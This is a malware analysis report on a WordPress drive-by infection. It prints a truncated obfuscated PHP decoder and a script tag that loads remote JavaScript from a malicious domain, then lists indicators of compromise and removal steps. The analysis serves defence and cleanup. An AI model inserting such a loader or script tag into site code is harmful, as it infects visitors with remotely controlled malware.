---
title: 'Drive-By Script Injection'
slug: 'drive-by-script-injection'
description: 'Analysis of the "Switch Domain" drive-by malware. Learn how simplecopseholding.com script injections and obfuscated PHP backdoors compromise WordPress sites and how to remove them.'
reportDate: '2026-01-23'
threatType: 'Script Injection'
severity: 'High'
fileHash: 'switch-domain-suspension-drive-by-malware'
detectedPaths: ['malware-sample-1.txt', 'malware-sample-2.txt']
screenshots:
  [
    '/images/wordpress-threats/switch-domain-suspension-drive-by-malware_evidence-1.png',
    '/images/wordpress-threats/switch-domain-suspension-drive-by-malware_evidence-2.png',
    '/images/wordpress-threats/switch-domain-suspension-drive-by-malware_evidence-3.png',
    '/images/wordpress-threats/switch-domain-suspension-drive-by-malware_evidence-4.png',
  ]
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: 'Can lead to unauthorized redirection, SEO degradation, and compromised user data if the external script is used to exploit further.'
seenOn: 'PHP files, HTML script tags'
behavior: 'Redirects users to external malicious content or injects more payloads'
difficulty: 'Moderate'
recurrence: 'Medium'
numberOfSiteFixed: 'some clients for the last few years'
---

## Technical Analysis

The malware consists of encoded PHP functions and injected JavaScript from malicious domains. PHP file 'malware-sample-1.txt' contains obfuscated and base64 encoded data indicative of a callback mechanism, while 'malware-sample-2.txt' links to an external script suggesting it fetches and executes JavaScript from external malicious sites. This is consistent with the 'Drive by malware' context provided by the user and may indicate an attempt to inject malicious JavaScript to unsuspecting visitors, likely with an intention for further exploitation or redirection.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. PHP file executes to decode and potentially retrieve instructions or payload from encoded data.
2. The web page containing malware-sample-2.txt includes a JavaScript script tag pointing to a malicious domain.
3. The JavaScript is executed on the client-side leading to potential redirection or further malicious activity.

## Code Signature(s)

### FILE: `malware-sample-1.php`

```php
<?php
function coincidemajesticallywing()
{
    // Surprisingly, a sensor may hardly generate DNS each process.
    $bestrideimpish = 'VkZod1ZtVkZOWEZhZWtrOQ==55dc6VkZaU1FtUXdNVlZYVkZKUVZWUXdPUT0958dffVkd4U1dtUXdNVVZaZWpBOQ==5be38Vkd0U1NrMUZOVlZoZWxaT1VWUXdPUT095ee71VkZkd1VsQlJQVDA961eaaTkE9PQ==64ee3VVZSWmVrMVVUVEphZWxZelpFZHNSRmRGU2paT1ZHUllZMVZzVTJKclZrcGpNRm93VlZSQ1drc3laSGROYkhCUFlVVldORTFIYkV0VU1ERnlVMVJLY2xGdVdsQmlWRkp3V1RKb1JtSkhTWFpVYm1oYVlUSmFUMHd5Y0RaVmVtaExXa1ZvYjJOV1VUTlZNMEphVmxWck9RPT0=67f1c62'; // Framework is OAuth more bluetooth than a deployment recursively with some legacy configuration and serializes this bus.
    $reachclinkingsense = ['55dc6', '58dff', '5be38', '5ee71', '61eaa', '64ee3', '67f1c'];

    // Split by last separator first (length)
    $generouslygloatpluck = explode('67f1c', $bestrideimpish);
    if (count($generouslygloatpluck) !== 2) return false;
    $sesametacklepecan = intval($generouslygloatpluck[1]);
    $whinesucklefootrest = $generouslygloatpluck[0];

    // Extract wrapped text
    $generouslygloatpluck = explode('64ee3', $whinesucklefootrest);
    if (count($generouslygloatpluck) !== 2) return false;
    $dragchairperson = $generouslygloatpluck[1];
    $whinesucklefootrest = $generouslygloatpluck[0];

    // Extract rounds
    $generouslygloatpluck = explode('61eaa', $whinesucklefootrest);
    if (count($generouslygloatpluck) !== 2) return false;
    $retentionpreheattight = $generouslygloatpluck[1];
    $whinesucklefootrest = $generouslygloatpluck[0];

    // Extract offset
    $generouslygloatpluck = explode('5ee71', $whinesucklefootrest);
    if (count($generouslygloatpluck) !== 2) return false;
    $tremendouslyroughlynoteworthy = $generouslygloatpluck[1];
    $whinesucklefootrest = $generouslygloatpluck[0];

    // Extract modulus
    $generouslygloatpluck = explode('5be38', $whinesucklefootrest);
    if (count($generouslygloatpluck) !== 2) return false;
    $hop
```

### FILE: `malware-sample-2.txt`

```txt
switch.ch


<script id="hexagoncontrail-js" src="https://simplecopseholding.com/jWcTAonomVveWlRkcUjN6PF-aopGXJy" type="text/javascript"></script>
```

## Indicators of Compromise (IOCs)

- `simplecopseholding.com`
- `switch.ch`
- `hexagoncontrail-js`

## Removal Protocol

1. Remove the file with the PHP encoded payload, in this case, ‘malware-sample-1.txt’.
1. Search for and remove the JavaScript link tag from ‘malware-sample-2.txt’.
1. Audit and clean any additional PHP, HTML, or JavaScript files for similar obfuscation or malicious script tags.
1. Change FTP and CMS passwords to prevent reinfection.
1. Update all plugins and themes to their latest versions, remove any unused plugins.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
